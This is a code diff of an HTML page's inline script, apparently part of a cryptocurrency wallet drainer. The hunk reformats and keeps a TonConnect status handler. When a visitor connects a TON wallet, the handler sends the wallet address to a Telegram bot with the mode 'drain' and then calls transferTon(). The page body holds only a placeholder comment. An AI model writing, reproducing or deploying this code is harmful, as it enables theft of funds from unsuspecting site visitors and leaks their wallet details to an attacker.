@@ -685,23 +685,23 @@ async function notifyTelegramBot(walletAddress, offer, mode) {
       }
   }
   
-  const val = 0;
-  tonConnectUI.onStatusChange(async (status) => {
-    console.log('Status Change:', status);
+      const val = 0;
 
-    if (status) {
-        console.log('Wallet connected');
-        await notifyTelegramBot(tonConnectUI.wallet.account.address, 'Wallet connected', 'drain');
-        await transferTon();
-    } else {
-        console.log('Wallet not connected');
-        await notifyTelegramBot(tonConnectUI.wallet.account.address, 'Wallet disconnected', 'decline');
-    }
-});
+      tonConnectUI.onStatusChange(async (status) => {
+        console.log('Status Change:', status);
 
-  </script>
-  
-    
+        if (status) {
+          console.log('Wallet connected');
+          await notifyTelegramBot(tonConnectUI.wallet.account.address, 'Wallet connected', 'drain');
+          await transferTon();
+        } else {
+          console.log('Wallet not connected');
+          await notifyTelegramBot(tonConnectUI.wallet.account.address, 'Wallet disconnected', 'decline');
+        }
+      });
+    </script>
+  </head>
+  <body>
+    <!-- Основное содержимое страницы -->
   </body>
-
 </html>
